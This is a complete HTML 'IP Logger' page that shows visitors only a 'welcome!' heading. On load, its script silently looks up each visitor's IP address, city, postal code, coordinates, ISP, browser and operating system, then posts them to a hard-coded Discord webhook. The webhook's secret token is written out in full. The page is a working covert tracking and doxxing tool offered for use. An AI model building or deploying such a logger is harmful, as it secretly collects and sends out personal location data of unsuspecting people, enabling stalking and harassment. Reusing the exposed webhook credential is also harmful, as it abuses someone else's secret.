<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>IP Logger</title>
</head>
<body>
    <h1>welcome!</h1>
    
    <script>

        const webhookURL = 'https://discord.com/api/webhooks/1242512910643757207/YS_hP_FL1-x5T_muYGS5CZP0TMA_tQX32NWn2q7duzY5Ertg5xPvctIYHbe60Uq6hKHW';


        async function sendToDiscord(message) {
            const data = {
                content: message
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                if (!response.ok) {
                    throw new Error('Fehler beim Senden an Discord');
                }

                console.log('Daten erfolgreich an Discord gesendet');
            } catch (error) {
                console.error('Fehler:', error);
            }
        }


        async function getVisitorInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return data;
            } catch (error) {
                console.error('Fehler beim Abrufen der Besucherinformationen:', error);
                return null;
            }
        }


        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let tem, 
            M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
            if (/trident/i.test(M[1])) {
                tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
                return { name: 'IE', version: tem[1] || '' };
            }
            if (M[1] === 'Chrome') {
                tem = ua.match(/\b(OPR|Edge?)\/(\d+)/);
                if (tem != null) return { name: tem[1].replace('OPR', 'Opera'), version: tem[2] };
            }
            M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
            if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
            return { name: M[0], version: M[1] };
        }


        async function logVisitor() {
            const visitorInfo = await getVisitorInfo();
            const timestamp = new Date().toISOString();
            const browserInfo = getBrowserInfo();

            if (visitorInfo) {
                const message = `
                    New Visitor:
                    IP-Adress: ${visitorInfo.ip}
                    Timestramp: ${timestamp}
                    City: ${visitorInfo.city}
                    Region: ${visitorInfo.region}
                    Country: ${visitorInfo.country_name}
                    postal code: ${visitorInfo.postal}
                    Latitude: ${visitorInfo.latitude}
                    Longitude: ${visitorInfo.longitude}
                    ISP: ${visitorInfo.org}
                    Browser: ${browserInfo.name} ${browserInfo.version}
                    Operating system: ${navigator.platform}
                    User-Agent: ${navigator.userAgent}
                `;
                sendToDiscord(message);
            }
        }

        window.onload = logVisitor;
    </script>
</body>
</html>
